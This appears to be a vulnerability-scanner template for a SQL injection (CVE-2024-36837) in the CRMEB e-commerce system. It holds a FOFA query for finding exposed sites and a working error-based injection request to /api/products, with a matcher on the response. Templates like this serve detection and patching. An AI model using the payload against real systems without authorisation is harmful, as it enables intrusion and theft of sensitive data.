id: CRMEB-api_products-sql-injection

info:
  tags: CRMEB-api_products-sql-injection
  name: CRMEB开源电商系统 /api/products SQL注入漏洞(CVE-2024-36837)
  author: xc
  severity: high
  description: |-
    fofa: body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
    2024年6月，CRMEB开源电商系统发布了新补丁，发布了新补丁，修复了一处 SQL注入漏洞（CVE-2024-36837）。经分析，该漏洞可以通过请求api的路径接口来进行SQL注入，进而可能导致敏感信息泄露，该注入可暴露后台web绝对路径，深入利用可获取服务器权限，该漏洞无前置条件且利用简单，建议受影响的用户尽快修复漏洞。

http:
  - raw:
      - |
        GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(123123)))),0x7e),3550) HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '4297f44b13955235245b2497399d7a93'
      - type: status
        status: 
          - 200





